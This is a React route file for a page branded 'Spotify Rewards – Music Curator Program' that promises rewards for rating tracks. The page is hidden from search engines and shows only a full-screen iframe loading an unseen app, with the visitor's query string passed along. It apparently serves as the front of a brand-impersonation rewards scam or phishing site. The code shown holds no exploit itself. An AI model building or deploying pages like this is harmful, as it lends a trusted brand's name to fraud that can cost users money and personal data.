import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Spotify Rewards – Music Curator Program" },
      { name: "description", content: "Certified music reviewer portal. Rate tracks and earn rewards." },
      { name: "robots", content: "noindex, nofollow" },
      { property: "og:title", content: "Spotify Rewards – Music Curator Program" },
      { property: "og:description", content: "Certified music reviewer portal. Rate tracks and earn rewards." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: Index,
});

function Index() {
  const [iframeSrc, setIframeSrc] = useState("/sp/app/app.html");

  useEffect(() => {
    if (typeof window !== "undefined") {
      setIframeSrc(`/sp/app/app.html${window.location.search}`);
    }
  }, []);

  return (
    <div
      style={{
        position: "fixed",
        inset: 0,
        width: "100%",
        height: "100dvh",
        overflow: "hidden",
        WebkitOverflowScrolling: "touch",
      }}
    >
      <iframe
        src={iframeSrc}
        title="Spotify Rewards"
        style={{
          width: "100%",
          height: "100%",
          border: "none",
          display: "block",
        }}
        allow="autoplay; clipboard-write"
      />
    </div>
  );
}
